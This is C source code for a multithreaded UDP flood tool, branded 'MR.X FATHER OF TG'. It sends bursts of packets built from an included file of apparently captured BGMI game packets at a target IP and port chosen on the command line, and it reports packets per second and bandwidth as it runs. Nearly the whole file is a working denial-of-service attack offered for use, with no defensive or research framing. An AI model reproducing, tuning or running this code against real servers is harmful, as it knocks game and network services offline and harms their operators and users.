#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>
#include <stdatomic.h>
#include <errno.h>
#include <signal.h>
#include <sys/time.h>
#include "bgmi_payloads.h"

#define MAX_SOCK_PER_THREAD 64
#define MAX_PKT_SIZE 1024
#define MIN_PKT_SIZE 40
#define MIN_THREADS 100
#define MAX_THREADS 200
#define MIN_TIME 10
#define MAX_TIME 300
#define SRC_START 10000
#define SRC_END 60000
#define RECONNECT_AFTER 3000
#define BURST_SIZE 40
#define STATS_INTERVAL 1

char TARGET_IP[64];
int TARGET_PORT;
int ATTACK_TIME;
int THREAD_COUNT;

atomic_ullong total_packets = 0;
atomic_ullong total_bytes = 0;
atomic_ullong peak_pps = 0;
atomic_int stop_signal = 0;

struct sockaddr_in target_addr;

unsigned int fast_rand(unsigned int *seed) {
    *seed = *seed * 1103515245 + 12345;
    return *seed;
}

void create_payload(char *buf, int *size, unsigned int *seed) {
    int idx = fast_rand(seed) % NUM_PAYLOADS;
    *size = ALL_SIZES[idx];
    memcpy(buf, ALL_PAYLOADS[idx], *size);
}

int make_socket(unsigned int *seed) {
    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s < 0) return -1;
    int buf = 16 * 1024 * 1024;
    setsockopt(s, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));
    fcntl(s, F_SETFL, O_NONBLOCK);
    struct sockaddr_in local;
    local.sin_family = AF_INET;
    local.sin_port = htons(SRC_START + (fast_rand(seed) % (SRC_END - SRC_START)));
    local.sin_addr.s_addr = INADDR_ANY;
    bind(s, (struct sockaddr*)&local, sizeof(local));
    return s;
}

void *thread_worker(void *arg) {
    int tid = *(int*)arg;
    struct timeval tv;
    gettimeofday(&tv, NULL);
    unsigned int seed = tid * 7654321 + tv.tv_usec + getpid();
    int socks[MAX_SOCK_PER_THREAD];
    unsigned int counter[MAX_SOCK_PER_THREAD] = {0};
    char packet[MAX_PKT_SIZE];
    int pkt_size;
    for (int i = 0; i < MAX_SOCK_PER_THREAD; i++) {
        socks[i] = make_socket(&seed);
        usleep(fast_rand(&seed) % 1000);
    }
    unsigned long long local_packets = 0, local_bytes = 0;
    while (!atomic_load(&stop_signal)) {
        for (int i = 0; i < MAX_SOCK_PER_THREAD && !atomic_load(&stop_signal); i++) {
            if (socks[i] < 0) continue;
            if (counter[i] > RECONNECT_AFTER) {
                close(socks[i]);
                socks[i] = make_socket(&seed);
                counter[i] = 0;
                continue;
            }
            create_payload(packet, &pkt_size, &seed);
            for (int b = 0; b < BURST_SIZE && !atomic_load(&stop_signal); b++) {
                int sent = sendto(socks[i], packet, pkt_size, 0, (struct sockaddr*)&target_addr, sizeof(target_addr));
                if (sent > 0) {
                    local_packets++;
                    local_bytes += sent;
                    counter[i]++;
                }
            }
        }
        if (local_packets >= 10000) {
            atomic_fetch_add(&total_packets, local_packets);
            atomic_fetch_add(&total_bytes, local_bytes);
            local_packets = 0; local_bytes = 0;
        }
        usleep(50);
    }
    atomic_fetch_add(&total_packets, local_packets);
    atomic_fetch_add(&total_bytes, local_bytes);
    for (int i = 0; i < MAX_SOCK_PER_THREAD; i++) if (socks[i] >= 0) close(socks[i]);
    return NULL;
}

void *direct_worker(void *arg) {
    struct timeval tv;
    gettimeofday(&tv, NULL);
    unsigned int seed = 999999 + tv.tv_usec;
    int socks[MAX_SOCK_PER_THREAD * 2];
    unsigned int counter[MAX_SOCK_PER_THREAD * 2] = {0};
    char packet[MAX_PKT_SIZE];
    int pkt_size;
    for (int i = 0; i < MAX_SOCK_PER_THREAD * 2; i++) {
        socks[i] = make_socket(&seed);
        usleep(fast_rand(&seed) % 500);
    }
    unsigned long long local_packets = 0, local_bytes = 0;
    while (!atomic_load(&stop_signal)) {
        for (int i = 0; i < MAX_SOCK_PER_THREAD * 2 && !atomic_load(&stop_signal); i++) {
            if (socks[i] < 0) continue;
            if (counter[i] > RECONNECT_AFTER) {
                close(socks[i]);
                socks[i] = make_socket(&seed);
                counter[i] = 0;
                continue;
            }
            create_payload(packet, &pkt_size, &seed);
            for (int b = 0; b < BURST_SIZE * 2 && !atomic_load(&stop_signal); b++) {
                int sent = sendto(socks[i], packet, pkt_size, 0, (struct sockaddr*)&target_addr, sizeof(target_addr));
                if (sent > 0) {
                    local_packets++;
                    local_bytes += sent;
                    counter[i]++;
                }
            }
        }
        if (local_packets >= 10000) {
            atomic_fetch_add(&total_packets, local_packets);
            atomic_fetch_add(&total_bytes, local_bytes);
            local_packets = 0; local_bytes = 0;
        }
        usleep(30);
    }
    atomic_fetch_add(&total_packets, local_packets);
    atomic_fetch_add(&total_bytes, local_bytes);
    for (int i = 0; i < MAX_SOCK_PER_THREAD * 2; i++) if (socks[i] >= 0) close(socks[i]);
    return NULL;
}

void *stats_printer(void *arg) {
    unsigned long long last_packets = 0, last_bytes = 0;
    int sec = 0;
    while (!atomic_load(&stop_signal)) {
        sleep(STATS_INTERVAL);
        sec += STATS_INTERVAL;
        unsigned long long curr_packets = atomic_load(&total_packets);
        unsigned long long curr_bytes = atomic_load(&total_bytes);
        unsigned long long pps = (curr_packets - last_packets) / STATS_INTERVAL;
        unsigned long long mbps = ((curr_bytes - last_bytes) * 8) / (1000 * 1000 * STATS_INTERVAL);
        if (pps > atomic_load(&peak_pps)) atomic_store(&peak_pps, pps);
        printf("[%ds] 🔥 PPS: %lluK | Peak: %lluK | Speed: %lluMbps\n", sec, pps/1000, atomic_load(&peak_pps)/1000, mbps);
        last_packets = curr_packets;
        last_bytes = curr_bytes;
    }
    return NULL;
}

void handle_signal(int sig) { atomic_store(&stop_signal, 1); }

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s IP PORT TIME THREADS\n", argv[0]);
        return 1;
    }
    strcpy(TARGET_IP, argv[1]);
    TARGET_PORT = atoi(argv[2]);
    ATTACK_TIME = atoi(argv[3]);
    THREAD_COUNT = atoi(argv[4]);
    if (THREAD_COUNT < MIN_THREADS) THREAD_COUNT = MIN_THREADS;
    if (THREAD_COUNT > MAX_THREADS) THREAD_COUNT = MAX_THREADS;
    if (ATTACK_TIME < MIN_TIME) ATTACK_TIME = MIN_TIME;
    if (ATTACK_TIME > MAX_TIME) ATTACK_TIME = MAX_TIME;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(TARGET_PORT);
    inet_pton(AF_INET, TARGET_IP, &target_addr.sin_addr);
    printf("\n========== 🚀 MR.X FATHER OF TG 🚀 ==========\n");
    printf("🎯 Target: %s:%d\n", TARGET_IP, TARGET_PORT);
    printf("⏱️  Time: %d seconds\n", ATTACK_TIME);
    printf("🧵 Threads: %d\n", THREAD_COUNT);
    printf("💾 Payloads: %d real BGMI packets (auto size)\n", NUM_PAYLOADS);
    printf("===============================================\n\n");
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);
    int direct_tid = 999999;
    pthread_t direct_thread;
    pthread_create(&direct_thread, NULL, direct_worker, &direct_tid);
    pthread_t threads[MAX_THREADS];
    int tids[MAX_THREADS];
    for (int i = 0; i < THREAD_COUNT; i++) {
        tids[i] = i;
        pthread_create(&threads[i], NULL, thread_worker, &tids[i]);
        usleep(1000);
    }
    pthread_t stats_thread;
    pthread_create(&stats_thread, NULL, stats_printer, NULL);
    for (int i = 0; i < ATTACK_TIME && !atomic_load(&stop_signal); i++) sleep(1);
    atomic_store(&stop_signal, 1);
    pthread_join(direct_thread, NULL);
    for (int i = 0; i < THREAD_COUNT; i++) pthread_join(threads[i], NULL);
    pthread_join(stats_thread, NULL);
    unsigned long long total_p = atomic_load(&total_packets);
    unsigned long long total_b = atomic_load(&total_bytes);
    unsigned long long peak = atomic_load(&peak_pps);
    printf("\n✅ Attack Finished!\n");
    printf("📊 Total Packets: %llu\n", total_p);
    printf("📊 Average PPS: %lluK\n", (total_p/ATTACK_TIME)/1000);
    printf("📊 Peak PPS: %lluK\n", peak/1000);
    printf("📊 Total Data: %.2f GB\n", total_b / (1024.0 * 1024.0 * 1024.0));
    printf("===============================================\n");
    return 0;
}